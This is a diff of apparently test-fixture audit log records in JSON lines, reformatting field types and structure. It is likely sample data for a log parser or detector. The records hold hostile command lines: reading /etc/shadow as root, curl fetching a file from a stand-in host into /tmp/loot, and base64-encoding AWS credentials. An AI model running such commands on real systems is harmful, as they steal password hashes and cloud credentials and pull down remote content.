@@ -1,3 +1,3 @@
-{"ID":"1626611363.720:348","SYSCALL":{"exe":"/usr/bin/cat","uid":"0","ppid":"1200","comm":"cat"},"EXECVE":{"argc":"2","ARGV":["cat","/etc/shadow"]},"CWD":{"cwd":"/root"},"PATH":[{"item":"0","name":"/etc/shadow","nametype":"NORMAL"}],"PPID":{"exe":"/usr/bin/bash"},"UID":{"0":"root"}}
-{"ID":"1626611364.000:349","SYSCALL":{"exe":"/usr/bin/curl","uid":"1000","comm":"curl"},"EXECVE":{"argc":"5","ARGV":["curl","-s","http://192.0.2.1/x","-o","/tmp/loot"]},"CWD":{"cwd":"/home/u"},"UID":{"1000":"u"}}
-{"ID":"1626611365.500:350","SYSCALL":{"exe":"/usr/bin/base64","uid":"1000"},"PROCTITLE":{"ARGV_STR":"base64 /home/u/.aws/credentials"}}
+{"ID":"1626611363.720:348","SYSCALL":{"exe":"/usr/bin/cat","uid":0,"ppid":1200,"comm":"cat","UID":"root","AUID":"root","PPID":{"comm":"bash","exe":"/usr/bin/bash"}},"EXECVE":{"argc":2,"ARGV":["cat","/etc/shadow"]},"CWD":{"cwd":"/root"},"PATH":[{"item":0,"name":"/etc/shadow","nametype":"NORMAL"}]}
+{"ID":"1626611364.000:349","SYSCALL":{"exe":"/usr/bin/curl","uid":1000,"comm":"curl","UID":"u"},"EXECVE":{"argc":5,"ARGV":["curl","-s","http://192.0.2.1/x","-o","/tmp/loot"]},"CWD":{"cwd":"/home/u"}}
+{"ID":"1626611365.500:350","SYSCALL":{"exe":"/usr/bin/base64","uid":1000},"PROCTITLE":{"ARGV_STR":"base64 /home/u/.aws/credentials"}}
